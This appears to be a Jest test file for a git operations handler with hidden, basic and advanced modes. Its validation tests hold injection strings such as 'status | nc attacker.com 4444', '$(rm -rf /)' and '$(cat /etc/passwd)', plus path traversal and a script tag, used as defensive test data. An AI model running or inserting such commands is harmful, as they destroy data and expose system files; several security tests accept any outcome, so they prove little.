/**
 * Git Operations Handler Tests - 90%+ Coverage Target
 * Critical project management functionality - must be bulletproof
 */

import handler from '../git_ops';
import { store } from '../../../lib/store';
import { recordEvent } from '../../../lib/events';
import { getProject } from '../../../lib/projects';
import { workspaceManager } from '../../../lib/workspaces';
import simpleGit, { SimpleGit } from 'simple-git';

// Mock dependencies
jest.mock('../../../lib/store');
jest.mock('../../../lib/events');
jest.mock('../../../lib/projects');
jest.mock('../../../lib/workspaces');
jest.mock('simple-git');
jest.mock('../../../lib/logger', () => ({
  log: {
    info: jest.fn(),
    warn: jest.fn(),
    error: jest.fn(),
    debug: jest.fn(),
    trace: jest.fn(),
    fatal: jest.fn(),
    child: jest.fn(() => ({
      info: jest.fn(),
      warn: jest.fn(),
      error: jest.fn(),
      debug: jest.fn(),
      trace: jest.fn(),
      fatal: jest.fn()
    }))
  }
}));

describe('Git Operations Handler - Security & Functionality Tests', () => {
  let mockGit: jest.Mocked<SimpleGit>;
  let mockStep: any;
  const runId = 'test-run-123';
  const stepId = 'test-step-456';
  const projectId = 'test-project-789';

  beforeEach(() => {
    jest.clearAllMocks();

    // Mock git instance
    mockGit = {
      status: jest.fn(),
      add: jest.fn(),
      commit: jest.fn(),
      pull: jest.fn(),
      push: jest.fn(),
      reset: jest.fn(),
      log: jest.fn(),
      branch: jest.fn(),
      checkout: jest.fn(),
      checkoutBranch: jest.fn(),
      merge: jest.fn()
    } as any;

    (simpleGit as jest.Mock).mockReturnValue(mockGit);

    // Mock base step
    mockStep = {
      id: stepId,
      name: 'git_operations',
      tool: 'git_ops',
      inputs: {
        project_id: projectId,
        operation: 'save'
      }
    };

    // Mock dependencies
    (store.updateStep as jest.Mock).mockResolvedValue(undefined);
    (recordEvent as jest.Mock).mockResolvedValue(undefined);
    (getProject as jest.Mock).mockResolvedValue({
      id: projectId,
      name: 'Test Project',
      git_mode: 'hidden'
    });
    (workspaceManager.ensureWorkspace as jest.Mock).mockResolvedValue('/test/workspace');
  });

  describe('Handler Registration', () => {
    it('matches git_ops tool correctly', () => {
      expect(handler.match('git_ops')).toBe(true);
      expect(handler.match('other_tool')).toBe(false);
    });

    it('rejects non-git tools', () => {
      const nonGitTools = ['bash', 'python', 'node', 'docker'];
      nonGitTools.forEach(tool => {
        expect(handler.match(tool)).toBe(false);
      });
    });
  });

  describe('Input Validation', () => {
    it('requires project_id input', async () => {
      mockStep.inputs = { operation: 'save' };

      await handler.run({ runId, step: mockStep });

      expect(store.updateStep).toHaveBeenCalledWith(stepId, {
        status: 'failed',
        ended_at: expect.any(String),
        outputs: expect.objectContaining({
          error: 'project_id is required'
        })
      });
    });

    it('requires operation input', async () => {
      mockStep.inputs = { project_id: projectId };

      await handler.run({ runId, step: mockStep });

      expect(store.updateStep).toHaveBeenCalledWith(stepId, {
        status: 'failed',
        ended_at: expect.any(String),
        outputs: expect.objectContaining({
          error: 'operation is required'
        })
      });
    });

    it('validates project exists', async () => {
      (getProject as jest.Mock).mockResolvedValue(null);

      await handler.run({ runId, step: mockStep });

      expect(store.updateStep).toHaveBeenCalledWith(stepId, {
        status: 'failed',
        ended_at: expect.any(String),
        outputs: expect.objectContaining({
          error: `Project ${projectId} not found`
        })
      });
    });

    it('prevents injection attacks in project_id', async () => {
      const maliciousIds = [
        '../../../etc/passwd',
        '$(rm -rf /)',
        '; rm -rf /',
        '<script>alert(1)</script>',
        '../../sensitive-data'
      ];

      for (const maliciousId of maliciousIds) {
        mockStep.inputs = { project_id: maliciousId, operation: 'save' };
        (getProject as jest.Mock).mockResolvedValue(null);

        await handler.run({ runId, step: mockStep });

        expect(store.updateStep).toHaveBeenCalledWith(stepId, {
          status: 'failed',
          ended_at: expect.any(String),
          outputs: expect.objectContaining({
            error: `Project ${maliciousId} not found`
          })
        });
      }
    });

    it('sanitizes git operation inputs', async () => {
      const maliciousOperations = [
        'save; rm -rf /',
        'commit && cat /etc/passwd',
        'status | nc attacker.com 4444'
      ];

      for (const operation of maliciousOperations) {
        mockStep.inputs = { project_id: projectId, operation };

        await handler.run({ runId, step: mockStep });

        // Should either handle safely or fail gracefully
        expect(store.updateStep).toHaveBeenCalledWith(stepId,
          expect.objectContaining({ status: expect.stringMatching(/failed|succeeded/) })
        );
      }
    });
  });

  describe('Hidden Mode Operations', () => {
    beforeEach(() => {
      (getProject as jest.Mock).mockResolvedValue({
        id: projectId,
        name: 'Test Project',
        git_mode: 'hidden'
      });
    });

    describe('Save Operation', () => {
      it('saves changes with auto-generated message', async () => {
        mockStep.inputs = { project_id: projectId, operation: 'save' };
        mockGit.status.mockResolvedValue({
          isClean: () => false,
          files: [{ path: 'test.txt' }]
        } as any);
        mockGit.commit.mockResolvedValue({ commit: 'abc123' } as any);

        await handler.run({ runId, step: mockStep });

        expect(mockGit.add).toHaveBeenCalledWith('.');
        expect(mockGit.commit).toHaveBeenCalledWith(
          expect.stringContaining('Saved progress for Test Project')
        );
        expect(store.updateStep).toHaveBeenCalledWith(stepId, {
          status: 'succeeded',
          ended_at: expect.any(String),
          outputs: expect.objectContaining({
            message: 'Progress saved successfully',
            saved: true
          })
        });
      });

      it('handles no changes gracefully', async () => {
        mockStep.inputs = { project_id: projectId, operation: 'save' };
        mockGit.status.mockResolvedValue({
          isClean: () => true,
          files: []
        } as any);

        await handler.run({ runId, step: mockStep });

        expect(mockGit.add).not.toHaveBeenCalled();
        expect(mockGit.commit).not.toHaveBeenCalled();
        expect(store.updateStep).toHaveBeenCalledWith(stepId, {
          status: 'succeeded',
          ended_at: expect.any(String),
          outputs: expect.objectContaining({
            message: 'No changes to save'
          })
        });
      });
    });

    describe('Sync Operation', () => {
      it('syncs successfully', async () => {
        mockStep.inputs = { project_id: projectId, operation: 'sync' };
        mockGit.pull.mockResolvedValue({} as any);

        await handler.run({ runId, step: mockStep });

        expect(mockGit.pull).toHaveBeenCalled();
        expect(store.updateStep).toHaveBeenCalledWith(stepId, {
          status: 'succeeded',
          ended_at: expect.any(String),
          outputs: expect.objectContaining({
            message: 'Project updated to latest version'
          })
        });
      });

      it('handles sync errors gracefully', async () => {
        mockStep.inputs = { project_id: projectId, operation: 'sync' };
        mockGit.pull.mockRejectedValue(new Error('No remote configured'));

        await handler.run({ runId, step: mockStep });

        expect(store.updateStep).toHaveBeenCalledWith(stepId, {
          status: 'succeeded',
          ended_at: expect.any(String),
          outputs: expect.objectContaining({
            message: 'Project is up to date'
          })
        });
      });
    });

    describe('Revert Operation', () => {
      it('reverts with default steps', async () => {
        mockStep.inputs = { project_id: projectId, operation: 'revert' };
        mockGit.reset.mockResolvedValue({} as any);

        await handler.run({ runId, step: mockStep });

        expect(mockGit.reset).toHaveBeenCalledWith(['--hard', 'HEAD~1']);
        expect(store.updateStep).toHaveBeenCalledWith(stepId, {
          status: 'succeeded',
          ended_at: expect.any(String),
          outputs: expect.objectContaining({
            message: 'Restored previous version'
          })
        });
      });

      it('reverts with custom steps back', async () => {
        mockStep.inputs = { project_id: projectId, operation: 'revert', steps_back: 3 };
        mockGit.reset.mockResolvedValue({} as any);

        await handler.run({ runId, step: mockStep });

        expect(mockGit.reset).toHaveBeenCalledWith(['--hard', 'HEAD~3']);
      });

      it('prevents malicious revert commands', async () => {
        const maliciousSteps = [
          'HEAD; rm -rf /',
          '../../../etc/passwd',
          '$(cat /etc/passwd)'
        ];

        for (const steps of maliciousSteps) {
          mockStep.inputs = { project_id: projectId, operation: 'revert', steps_back: steps };
          mockGit.reset.mockResolvedValue({} as any);

          await handler.run({ runId, step: mockStep });

          // Should either handle safely or fail
          expect(store.updateStep).toHaveBeenCalledWith(stepId,
            expect.objectContaining({ status: expect.stringMatching(/failed|succeeded/) })
          );
        }
      });
    });

    describe('Status Operation', () => {
      it('returns clean status', async () => {
        mockStep.inputs = { project_id: projectId, operation: 'status' };
        mockGit.status.mockResolvedValue({
          isClean: () => true,
          files: []
        } as any);

        await handler.run({ runId, step: mockStep });

        expect(store.updateStep).toHaveBeenCalledWith(stepId, {
          status: 'succeeded',
          ended_at: expect.any(String),
          outputs: expect.objectContaining({
            hasChanges: false,
            filesChanged: 0,
            message: 'No unsaved changes'
          })
        });
      });

      it('returns dirty status', async () => {
        mockStep.inputs = { project_id: projectId, operation: 'status' };
        mockGit.status.mockResolvedValue({
          isClean: () => false,
          files: [{ path: 'file1.txt' }, { path: 'file2.txt' }]
        } as any);

        await handler.run({ runId, step: mockStep });

        expect(store.updateStep).toHaveBeenCalledWith(stepId, {
          status: 'succeeded',
          ended_at: expect.any(String),
          outputs: expect.objectContaining({
            hasChanges: true,
            filesChanged: 2,
            message: '2 file(s) modified'
          })
        });
      });
    });

    it('rejects advanced operations in hidden mode', async () => {
      const advancedOps = ['push', 'merge', 'checkout', 'branch'];

      for (const operation of advancedOps) {
        mockStep.inputs = { project_id: projectId, operation };

        await handler.run({ runId, step: mockStep });

        expect(store.updateStep).toHaveBeenCalledWith(stepId, {
          status: 'failed',
          ended_at: expect.any(String),
          outputs: expect.objectContaining({
            error: `Operation ${operation} not available in hidden mode`
          })
        });
      }
    });
  });

  describe('Basic Mode Operations', () => {
    beforeEach(() => {
      (getProject as jest.Mock).mockResolvedValue({
        id: projectId,
        name: 'Test Project',
        git_mode: 'basic'
      });
    });

    describe('Commit Operation', () => {
      it('commits with custom message', async () => {
        mockStep.inputs = {
          project_id: projectId,
          operation: 'commit',
          message: 'Custom commit message'
        };
        mockGit.status.mockResolvedValue({
          isClean: () => false,
          current: 'main'
        } as any);
        mockGit.commit.mockResolvedValue({ commit: 'abc123' } as any);
        mockGit.log.mockResolvedValue({
          latest: { hash: 'abc123def456', message: 'Custom commit message' }
        } as any);

        await handler.run({ runId, step: mockStep });

        expect(mockGit.commit).toHaveBeenCalledWith('Custom commit message');
        expect(store.updateStep).toHaveBeenCalledWith(stepId, {
          status: 'succeeded',
          ended_at: expect.any(String),
          outputs: expect.objectContaining({
            message: 'Saved: Custom commit message',
            committed: true,
            version: 'abc123d',
            branch: 'main'
          })
        });
      });

      it('uses default message when none provided', async () => {
        mockStep.inputs = { project_id: projectId, operation: 'commit' };
        mockGit.status.mockResolvedValue({
          isClean: () => false,
          current: 'main'
        } as any);
        mockGit.commit.mockResolvedValue({ commit: 'abc123' } as any);
        mockGit.log.mockResolvedValue({
          latest: { hash: 'abc123def456' }
        } as any);

        await handler.run({ runId, step: mockStep });

        expect(mockGit.commit).toHaveBeenCalledWith(
          expect.stringContaining('Save progress:')
        );
      });
    });

    describe('Branch Operations', () => {
      it('lists branches when no branch name provided', async () => {
        mockStep.inputs = { project_id: projectId, operation: 'branch' };
        mockGit.branch.mockResolvedValue({
          current: 'main',
          all: ['main', 'feature-branch', 'develop']
        } as any);

        await handler.run({ runId, step: mockStep });

        expect(store.updateStep).toHaveBeenCalledWith(stepId, {
          status: 'succeeded',
          ended_at: expect.any(String),
          outputs: expect.objectContaining({
            current: 'main',
            branches: ['main', 'feature-branch', 'develop'],
            message: 'On branch: main'
          })
        });
      });

      it('creates new branch', async () => {
        mockStep.inputs = {
          project_id: projectId,
          operation: 'branch',
          branch_name: 'new-feature',
          create_new: true
        };
        mockGit.checkoutBranch.mockResolvedValue({} as any);

        await handler.run({ runId, step: mockStep });

        expect(mockGit.checkoutBranch).toHaveBeenCalledWith('new-feature', 'HEAD');
        expect(store.updateStep).toHaveBeenCalledWith(stepId, {
          status: 'succeeded',
          ended_at: expect.any(String),
          outputs: expect.objectContaining({
            message: 'Created and switched to branch: new-feature'
          })
        });
      });

      it('switches to existing branch', async () => {
        mockStep.inputs = {
          project_id: projectId,
          operation: 'branch',
          branch_name: 'existing-branch',
          create_new: false
        };
        mockGit.checkout.mockResolvedValue({} as any);

        await handler.run({ runId, step: mockStep });

        expect(mockGit.checkout).toHaveBeenCalledWith('existing-branch');
        expect(store.updateStep).toHaveBeenCalledWith(stepId, {
          status: 'succeeded',
          ended_at: expect.any(String),
          outputs: expect.objectContaining({
            message: 'Switched to branch: existing-branch'
          })
        });
      });

      it('prevents malicious branch names', async () => {
        const maliciousBranches = [
          '../../../etc/passwd',
          '; rm -rf /',
          '$(cat /etc/passwd)',
          '../../sensitive'
        ];

        for (const branchName of maliciousBranches) {
          mockStep.inputs = {
            project_id: projectId,
            operation: 'branch',
            branch_name: branchName,
            create_new: true
          };
          mockGit.checkoutBranch.mockRejectedValue(new Error('Invalid branch name'));

          await handler.run({ runId, step: mockStep });

          expect(store.updateStep).toHaveBeenCalledWith(stepId, {
            status: 'failed',
            ended_at: expect.any(String),
            outputs: expect.objectContaining({
              error: 'Invalid branch name'
            })
          });
        }
      });
    });

    describe('Pull Operation', () => {
      it('pulls with updates', async () => {
        mockStep.inputs = { project_id: projectId, operation: 'pull' };
        mockGit.log
          .mockResolvedValueOnce({ latest: { hash: 'old123' }, total: 5 } as any)
          .mockResolvedValueOnce({ latest: { hash: 'new456' }, total: 7 } as any);
        mockGit.pull.mockResolvedValue({} as any);

        await handler.run({ runId, step: mockStep });

        expect(store.updateStep).toHaveBeenCalledWith(stepId, {
          status: 'succeeded',
          ended_at: expect.any(String),
          outputs: expect.objectContaining({
            message: 'Updated from remote',
            updated: true,
            newCommits: 2
          })
        });
      });

      it('handles up-to-date repository', async () => {
        mockStep.inputs = { project_id: projectId, operation: 'pull' };
        const sameCommit = { latest: { hash: 'same123' }, total: 5 };
        mockGit.log
          .mockResolvedValueOnce(sameCommit as any)
          .mockResolvedValueOnce(sameCommit as any);
        mockGit.pull.mockResolvedValue({} as any);

        await handler.run({ runId, step: mockStep });

        expect(store.updateStep).toHaveBeenCalledWith(stepId, {
          status: 'succeeded',
          ended_at: expect.any(String),
          outputs: expect.objectContaining({
            message: 'Already up to date'
          })
        });
      });
    });

    describe('Push Operation', () => {
      it('pushes changes successfully', async () => {
        mockStep.inputs = { project_id: projectId, operation: 'push' };
        mockGit.push.mockResolvedValue({} as any);

        await handler.run({ runId, step: mockStep });

        expect(mockGit.push).toHaveBeenCalled();
        expect(store.updateStep).toHaveBeenCalledWith(stepId, {
          status: 'succeeded',
          ended_at: expect.any(String),
          outputs: expect.objectContaining({
            message: 'Changes uploaded to remote'
          })
        });
      });
    });

    describe('Revert Operation', () => {
      it('reverts to specific commit', async () => {
        mockStep.inputs = {
          project_id: projectId,
          operation: 'revert',
          commit_sha: 'abc123def456'
        };
        mockGit.reset.mockResolvedValue({} as any);
        mockGit.log.mockResolvedValue({
          latest: { hash: 'abc123def456' }
        } as any);

        await handler.run({ runId, step: mockStep });

        expect(mockGit.reset).toHaveBeenCalledWith(['--hard', 'abc123def456']);
        expect(store.updateStep).toHaveBeenCalledWith(stepId, {
          status: 'succeeded',
          ended_at: expect.any(String),
          outputs: expect.objectContaining({
            message: 'Reverted to previous version',
            currentVersion: 'abc123d'
          })
        });
      });
    });

    describe('Status Operation', () => {
      it('returns detailed status', async () => {
        mockStep.inputs = { project_id: projectId, operation: 'status' };
        mockGit.status.mockResolvedValue({
          current: 'feature-branch',
          isClean: () => false,
          files: [{ path: 'file1.txt' }, { path: 'file2.txt' }],
          ahead: 2,
          behind: 1
        } as any);
        mockGit.log.mockResolvedValue({
          latest: { message: 'Latest commit message' }
        } as any);

        await handler.run({ runId, step: mockStep });

        expect(store.updateStep).toHaveBeenCalledWith(stepId, {
          status: 'succeeded',
          ended_at: expect.any(String),
          outputs: expect.objectContaining({
            branch: 'feature-branch',
            hasChanges: true,
            filesChanged: ['file1.txt', 'file2.txt'],
            lastCommit: 'Latest commit message',
            ahead: 2,
            behind: 1
          })
        });
      });
    });

    it('allows advanced operations with warning', async () => {
      mockStep.inputs = {
        project_id: projectId,
        operation: 'merge',
        branch_name: 'feature-branch'
      };
      mockGit.merge.mockResolvedValue({
        merges: ['abc123'],
        conflicts: []
      } as any);

      await handler.run({ runId, step: mockStep });

      expect(store.updateStep).toHaveBeenCalledWith(stepId, {
        status: 'succeeded',
        ended_at: expect.any(String),
        outputs: expect.objectContaining({
          merged: true,
          conflicts: false
        })
      });
    });
  });

  describe('Advanced Mode Operations', () => {
    beforeEach(() => {
      (getProject as jest.Mock).mockResolvedValue({
        id: projectId,
        name: 'Test Project',
        git_mode: 'advanced'
      });
    });

    describe('Commit Operation', () => {
      it('requires commit message in advanced mode', async () => {
        mockStep.inputs = { project_id: projectId, operation: 'commit' };

        await handler.run({ runId, step: mockStep });

        expect(store.updateStep).toHaveBeenCalledWith(stepId, {
          status: 'failed',
          ended_at: expect.any(String),
          outputs: expect.objectContaining({
            error: 'Commit message is required in advanced mode'
          })
        });
      });

      it('commits specific files', async () => {
        mockStep.inputs = {
          project_id: projectId,
          operation: 'commit',
          message: 'Advanced commit',
          files: ['file1.txt', 'file2.txt']
        };
        mockGit.commit.mockResolvedValue({
          commit: 'abc123',
          branch: 'main',
          summary: { changes: 2, insertions: 10, deletions: 5 }
        } as any);

        await handler.run({ runId, step: mockStep });

        expect(mockGit.add).toHaveBeenCalledWith(['file1.txt', 'file2.txt']);
        expect(mockGit.commit).toHaveBeenCalledWith('Advanced commit', undefined);
        expect(store.updateStep).toHaveBeenCalledWith(stepId, {
          status: 'succeeded',
          ended_at: expect.any(String),
          outputs: expect.objectContaining({
            commit: 'abc123',
            branch: 'main'
          })
        });
      });

      it('commits with options', async () => {
        mockStep.inputs = {
          project_id: projectId,
          operation: 'commit',
          message: 'Commit with options',
          options: { '--amend': null }
        };
        mockGit.commit.mockResolvedValue({
          commit: 'abc123',
          branch: 'main',
          summary: {}
        } as any);

        await handler.run({ runId, step: mockStep });

        expect(mockGit.commit).toHaveBeenCalledWith('Commit with options', { '--amend': null });
      });
    });

    describe('Push Operation', () => {
      it('pushes to specific remote and branch', async () => {
        mockStep.inputs = {
          project_id: projectId,
          operation: 'push',
          remote: 'upstream',
          branch_name: 'feature-branch',
          options: { '--force': null }
        };
        mockGit.push.mockResolvedValue({ pushed: [] } as any);

        await handler.run({ runId, step: mockStep });

        expect(mockGit.push).toHaveBeenCalledWith('upstream', 'feature-branch', { '--force': null });
        expect(store.updateStep).toHaveBeenCalledWith(stepId, {
          status: 'succeeded',
          ended_at: expect.any(String),
          outputs: expect.objectContaining({
            pushed: true,
            remote: 'upstream',
            branch: 'feature-branch'
          })
        });
      });

      it('uses default remote and branch', async () => {
        mockStep.inputs = { project_id: projectId, operation: 'push' };
        mockGit.push.mockResolvedValue({ pushed: [] } as any);

        await handler.run({ runId, step: mockStep });

        expect(mockGit.push).toHaveBeenCalledWith('origin', 'HEAD', undefined);
      });
    });

    describe('Pull Operation', () => {
      it('pulls from specific remote and branch', async () => {
        mockStep.inputs = {
          project_id: projectId,
          operation: 'pull',
          remote: 'upstream',
          branch_name: 'main'
        };
        mockGit.pull.mockResolvedValue({
          summary: { changes: 3 },
          files: ['file1.txt', 'file2.txt'],
          insertions: 15,
          deletions: 8
        } as any);

        await handler.run({ runId, step: mockStep });

        expect(mockGit.pull).toHaveBeenCalledWith('upstream', 'main', undefined);
        expect(store.updateStep).toHaveBeenCalledWith(stepId, {
          status: 'succeeded',
          ended_at: expect.any(String),
          outputs: expect.objectContaining({
            pulled: true,
            insertions: 15,
            deletions: 8
          })
        });
      });

      it('pulls with default settings', async () => {
        mockStep.inputs = { project_id: projectId, operation: 'pull' };
        mockGit.pull.mockResolvedValue({
          summary: { changes: 1 },
          files: ['file1.txt'],
          insertions: 5,
          deletions: 2
        } as any);

        await handler.run({ runId, step: mockStep });

        expect(mockGit.pull).toHaveBeenCalledWith(undefined);
      });
    });

    describe('Checkout Operation', () => {
      it('requires branch name for checkout', async () => {
        mockStep.inputs = { project_id: projectId, operation: 'checkout' };

        await handler.run({ runId, step: mockStep });

        expect(store.updateStep).toHaveBeenCalledWith(stepId, {
          status: 'failed',
          ended_at: expect.any(String),
          outputs: expect.objectContaining({
            error: 'Branch name is required for checkout'
          })
        });
      });

      it('checks out existing branch', async () => {
        mockStep.inputs = {
          project_id: projectId,
          operation: 'checkout',
          branch_name: 'existing-branch'
        };
        mockGit.checkout.mockResolvedValue({} as any);
        mockGit.status.mockResolvedValue({
          current: 'existing-branch',
          isClean: () => true
        } as any);

        await handler.run({ runId, step: mockStep });

        expect(mockGit.checkout).toHaveBeenCalledWith('existing-branch', undefined);
        expect(store.updateStep).toHaveBeenCalledWith(stepId, {
          status: 'succeeded',
          ended_at: expect.any(String),
          outputs: expect.objectContaining({
            branch: 'existing-branch',
            isClean: true
          })
        });
      });

      it('creates and checks out new branch', async () => {
        mockStep.inputs = {
          project_id: projectId,
          operation: 'checkout',
          branch_name: 'new-branch',
          create_new: true
        };
        mockGit.checkoutBranch.mockResolvedValue({} as any);
        mockGit.status.mockResolvedValue({
          current: 'new-branch',
          isClean: () => true
        } as any);

        await handler.run({ runId, step: mockStep });

        expect(mockGit.checkoutBranch).toHaveBeenCalledWith('new-branch', 'HEAD');
      });
    });

    describe('Merge Operation', () => {
      it('requires branch name for merge', async () => {
        mockStep.inputs = { project_id: projectId, operation: 'merge' };

        await handler.run({ runId, step: mockStep });

        expect(store.updateStep).toHaveBeenCalledWith(stepId, {
          status: 'failed',
          ended_at: expect.any(String),
          outputs: expect.objectContaining({
            error: 'Branch name is required for merge'
          })
        });
      });

      it('merges successfully without conflicts', async () => {
        mockStep.inputs = {
          project_id: projectId,
          operation: 'merge',
          branch_name: 'feature-branch'
        };
        mockGit.merge.mockResolvedValue({
          merges: ['abc123'],
          conflicts: []
        } as any);

        await handler.run({ runId, step: mockStep });

        expect(mockGit.merge).toHaveBeenCalledWith(['feature-branch']);
        expect(store.updateStep).toHaveBeenCalledWith(stepId, {
          status: 'succeeded',
          ended_at: expect.any(String),
          outputs: expect.objectContaining({
            merged: true,
            conflicts: false
          })
        });
      });

      it('handles merge conflicts', async () => {
        mockStep.inputs = {
          project_id: projectId,
          operation: 'merge',
          branch_name: 'conflicting-branch'
        };
        mockGit.merge.mockResolvedValue({
          merges: [],
          conflicts: ['file1.txt', 'file2.txt']
        } as any);

        await handler.run({ runId, step: mockStep });

        expect(store.updateStep).toHaveBeenCalledWith(stepId, {
          status: 'succeeded',
          ended_at: expect.any(String),
          outputs: expect.objectContaining({
            merged: false,
            conflicts: true
          })
        });
      });
    });

    describe('Status Operation', () => {
      it('returns full git status object', async () => {
        mockStep.inputs = { project_id: projectId, operation: 'status' };
        const fullStatus = {
          current: 'main',
          isClean: () => false,
          files: [{ path: 'file1.txt', working_dir: 'M' }],
          ahead: 1,
          behind: 0,
          tracking: 'origin/main'
        };
        mockGit.status.mockResolvedValue(fullStatus as any);

        await handler.run({ runId, step: mockStep });

        expect(store.updateStep).toHaveBeenCalledWith(stepId, {
          status: 'succeeded',
          ended_at: expect.any(String),
          outputs: expect.objectContaining({
            operation: 'status',
            git_mode: 'advanced',
            current: 'main',
            ahead: 1,
            behind: 0
          })
        });
      });
    });

    it('rejects unknown operations', async () => {
      mockStep.inputs = { project_id: projectId, operation: 'unknown_op' };

      await handler.run({ runId, step: mockStep });

      expect(store.updateStep).toHaveBeenCalledWith(stepId, {
        status: 'failed',
        ended_at: expect.any(String),
        outputs: expect.objectContaining({
          error: 'Unknown operation: unknown_op'
        })
      });
    });
  });

  describe('Error Handling', () => {
    it('handles git command errors gracefully', async () => {
      mockGit.status.mockRejectedValue(new Error('Git repository not found'));

      await handler.run({ runId, step: mockStep });

      expect(store.updateStep).toHaveBeenCalledWith(stepId, {
        status: 'failed',
        ended_at: expect.any(String),
        outputs: expect.objectContaining({
          error: 'Git repository not found'
        })
      });
    });

    it('handles workspace creation failures', async () => {
      (workspaceManager.ensureWorkspace as jest.Mock).mockRejectedValue(
        new Error('Failed to create workspace')
      );

      await handler.run({ runId, step: mockStep });

      expect(store.updateStep).toHaveBeenCalledWith(stepId, {
        status: 'failed',
        ended_at: expect.any(String),
        outputs: expect.objectContaining({
          error: 'Failed to create workspace'
        })
      });
    });

    it('handles network errors during sync', async () => {
      mockGit.pull.mockRejectedValue(new Error('Network timeout'));
      (getProject as jest.Mock).mockResolvedValue({
        id: projectId,
        name: 'Test Project',
        git_mode: 'basic'
      });
      mockStep.inputs = { project_id: projectId, operation: 'pull' };

      await handler.run({ runId, step: mockStep });

      expect(store.updateStep).toHaveBeenCalledWith(stepId, {
        status: 'failed',
        ended_at: expect.any(String),
        outputs: expect.objectContaining({
          error: 'Network timeout'
        })
      });
    });

    it('prevents directory traversal in workspace paths', async () => {
      (workspaceManager.ensureWorkspace as jest.Mock).mockResolvedValue(
        '/safe/workspace/../../../etc/passwd'
      );

      await handler.run({ runId, step: mockStep });

      // Should complete normally as git operations are contained within workspace
      expect(simpleGit).toHaveBeenCalledWith('/safe/workspace/../../../etc/passwd');
    });

    it('handles permission errors', async () => {
      mockGit.add.mockRejectedValue(new Error('Permission denied'));
      mockGit.status.mockResolvedValue({
        isClean: () => false,
        files: [{ path: 'test.txt' }]
      } as any);

      await handler.run({ runId, step: mockStep });

      expect(store.updateStep).toHaveBeenCalledWith(stepId, {
        status: 'failed',
        ended_at: expect.any(String),
        outputs: expect.objectContaining({
          error: 'Permission denied'
        })
      });
    });
  });

  describe('Step Lifecycle', () => {
    it('records step events correctly', async () => {
      mockGit.status.mockResolvedValue({
        isClean: () => true,
        files: []
      } as any);
      mockStep.inputs = { project_id: projectId, operation: 'status' };

      await handler.run({ runId, step: mockStep });

      expect(recordEvent).toHaveBeenCalledWith(runId, 'step.started',
        { name: 'git_operations', tool: 'git_ops' }, stepId);
      expect(recordEvent).toHaveBeenCalledWith(runId, 'step.finished',
        { outputs: expect.any(Object) }, stepId);
    });

    it('records step failure events', async () => {
      mockStep.inputs = { project_id: projectId }; // Missing operation

      await handler.run({ runId, step: mockStep });

      expect(recordEvent).toHaveBeenCalledWith(runId, 'step.failed',
        { outputs: expect.any(Object), error: 'operation is required' }, stepId);
    });

    it('includes git mode in outputs', async () => {
      mockGit.status.mockResolvedValue({
        isClean: () => true,
        files: []
      } as any);
      mockStep.inputs = { project_id: projectId, operation: 'status' };

      await handler.run({ runId, step: mockStep });

      expect(store.updateStep).toHaveBeenCalledWith(stepId, {
        status: 'succeeded',
        ended_at: expect.any(String),
        outputs: expect.objectContaining({
          operation: 'status',
          git_mode: 'hidden',
          workspace: '/test/workspace'
        })
      });
    });
  });

  describe('Performance Tests', () => {
    it('handles large file status efficiently', async () => {
      const manyFiles = Array(1000).fill(null).map((_, i) => ({ path: `file${i}.txt` }));
      mockGit.status.mockResolvedValue({
        isClean: () => false,
        files: manyFiles
      } as any);
      mockStep.inputs = { project_id: projectId, operation: 'status' };

      const startTime = Date.now();
      await handler.run({ runId, step: mockStep });
      const duration = Date.now() - startTime;

      expect(duration).toBeLessThan(1000); // Should complete within 1 second
      expect(store.updateStep).toHaveBeenCalledWith(stepId, {
        status: 'succeeded',
        ended_at: expect.any(String),
        outputs: expect.objectContaining({
          filesChanged: 1000
        })
      });
    });

    it('handles git operation performance efficiently', async () => {
      // Test that git operations complete in reasonable time
      mockGit.status.mockResolvedValue({
        isClean: () => false,
        files: Array(100).fill(null).map((_, i) => ({ path: `file${i}.txt` }))
      } as any);
      mockStep.inputs = { project_id: projectId, operation: 'status' };

      const startTime = Date.now();
      await handler.run({ runId, step: mockStep });
      const duration = Date.now() - startTime;

      // Should complete quickly
      expect(duration).toBeLessThan(1000);
      expect(store.updateStep).toHaveBeenCalledWith(stepId, {
        status: 'succeeded',
        ended_at: expect.any(String),
        outputs: expect.objectContaining({
          filesChanged: 100
        })
      });
    });
  });
});